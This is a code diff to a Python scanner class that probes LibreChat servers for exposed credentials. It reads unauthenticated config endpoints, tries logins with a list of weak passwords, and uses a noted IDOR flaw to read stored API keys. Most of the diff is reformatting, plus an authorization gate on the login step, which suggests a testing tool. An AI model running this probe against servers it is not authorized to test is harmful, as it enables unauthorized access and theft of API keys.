@@ -12,6 +12,7 @@ import logging
 from typing import Any
 
 from aipocket.core.models import Credential
+
 from ..base import WEAK_CREDENTIALS, Prober
 
 log = logging.getLogger(__name__)
@@ -31,18 +32,22 @@ class LibreChatProber(Prober):
         # 1. Unauthenticated config reads
         for path in ("/api/config", "/api/endpoints", "/api/health"):
             resp = await self._get(self._url(hit, path))
-            found = self._extract_from_response(resp, hit, f"librechat_{path.strip('/').replace('/', '_')}")
+            found = self._extract_from_response(
+                resp, hit, f"librechat_{path.strip('/').replace('/', '_')}"
+            )
             creds.extend(found)
 
         # 2. Weak-password login → read /api/keys (CVE-2026-31942 IDOR)
-        token = await self._try_login(hit)
+        token = await self._try_login(hit) if self._intrusive_authorized(hit) else ""
         if token:
             for path in ("/api/keys", "/api/endpoints"):
                 resp = await self._get(
                     self._url(hit, path),
                     headers={"Authorization": f"Bearer {token}"},
                 )
-                found = self._extract_from_response(resp, hit, f"librechat_authed_{path.strip('/').replace('/', '_')}")
+                found = self._extract_from_response(
+                    resp, hit, f"librechat_authed_{path.strip('/').replace('/', '_')}"
+                )
                 creds.extend(found)
 
         return creds
@@ -52,7 +57,9 @@ class LibreChatProber(Prober):
         if not url:
             return ""
         for username, password in WEAK_CREDENTIALS:
-            resp = await self._post(url, json={"email": username, "password": password, "username": username})
+            resp = await self._post(
+                url, json={"email": username, "password": password, "username": username}
+            )
             if resp is None or resp.status_code != 200:
                 continue
             try:
